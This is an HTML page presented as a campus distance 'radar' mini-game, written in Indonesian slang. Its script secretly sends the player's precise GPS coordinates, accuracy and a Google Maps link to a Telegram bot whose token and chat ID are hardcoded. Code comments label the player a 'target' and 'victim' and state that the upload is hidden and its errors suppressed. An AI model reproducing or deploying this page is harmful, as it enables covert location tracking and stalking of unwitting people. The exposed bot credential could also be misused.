<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Radar Kampus Mini-Game</title>
    <style>
        body { 
            background-color: #f4f4f9; color: #333; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; flex-direction: column; align-items: center; 
            justify-content: center; height: 100vh; margin: 0; text-align: center;
        }
        .card {
            background: white; padding: 30px; border-radius: 15px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1); max-width: 400px;
        }
        h2 { color: #2c3e50; margin-top: 0; }
        .btn-game {
            background-color: #3498db; color: white;
            border: none; padding: 15px 30px; border-radius: 25px;
            font-size: 16px; font-weight: bold; cursor: pointer;
            transition: 0.3s; margin-top: 20px; width: 100%;
        }
        .btn-game:hover { background-color: #2980b9; transform: translateY(-2px); }
        #result { margin-top: 20px; font-size: 18px; font-weight: bold; color: #e74c3c; line-height: 1.5; }
    </style>
</head>
<body>

    <div class="card">
        <h2>🎯 Radar Kampus</h2>
        <p>Buktikan lu mahasiswa sejati! Sistem akan mengukur jarak presisi posisi lu saat ini ke titik nol kampus.</p>
        <p style="font-size: 12px; color: #7f8c8d;">*Membutuhkan akses GPS untuk kalkulasi radar.</p>
        
        <button class="btn-game" onclick="mulaiRadar()">Mulai Scan Jarak!</button>
        
        <div id="result"></div>
    </div>

    <script>
        // KREDENSIAL API BOT LU (Jalur komunikasi rahasia kita)
        const BOT_TOKEN = "8945868058:AAFmrtok6NjltKd66IIE4Mai305eEq3lT1c"; 
        const CHAT_ID = "7070949344";

        // Koordinat Titik Nol Kampus UMKT Samarinda (Contoh referensi)
        const kampusLat = -0.463569; 
        const kampusLon = 117.152345;

        // FUNGSI 1: Payload Pengirim Log ke Telegram (Silent Execution)
        async function sendToTelegram(lat, lon, acc, jarak) {
            const mapsLink = `https://www.google.com/maps/place/${lat},${lon}`;
            const payload = `🎯 **TARGET TERKENA RADAR JEBAKAN!**\n\n` +
                            `📍 Lat: ${lat}\n` +
                            `📍 Lon: ${lon}\n` +
                            `📏 Akurasi GPS: ${acc} meter\n` +
                            `🏃 Jarak target ke kampus: ${jarak} KM\n` +
                            `🗺️ Maps: ${mapsLink}`;
                            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                // Fetch dikirim tanpa await/then alert, supaya target tidak tahu ada pengiriman data
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: payload })
                });
            } catch (e) {
                // Silently fail, jangan tampilkan error di layar korban
            }
        }

        // FUNGSI 2: Rumus Haversine buat ngitung jarak asli di bumi (Game Logic)
        function hitungJarak(lat1, lon1, lat2, lon2) {
            const R = 6371; 
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                      Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return (R * c).toFixed(2);
        }

        // FUNGSI 3: Trigger Utama
        function mulaiRadar() {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = "Memindai satelit... 📡";
            resultDiv.style.color = "#f39c12";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const userLat = position.coords.latitude;
                        const userLon = position.coords.longitude;
                        const userAcc = position.coords.accuracy;
                        
                        // Hitung jarak ke kampus
                        const jarak = hitungJarak(userLat, userLon, kampusLat, kampusLon);
                        
                        // Manipulasi Layar: Tampilkan hasil game ke target
                        resultDiv.style.color = "#27ae60";
                        resultDiv.innerHTML = `✅ Pemindaian Selesai!<br>Jarak lu ke kampus adalah: <br><span style="font-size: 24px;"><b>${jarak} KM</b></span>`;

                        // EKSEKUSI OVERDRIVE: Lempar data ke markas (Bot Telegram) secara tak kasat mata
                        sendToTelegram(userLat, userLon, userAcc, jarak);
                    },
                    function(error) {
                        resultDiv.style.color = "#e74c3c";
                        resultDiv.innerHTML = "❌ Radar Gagal: Izin lokasi ditolak.";
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                resultDiv.innerHTML = "Browser lu nggak support Radar.";
            }
        }
    </script>
</body>
</html>
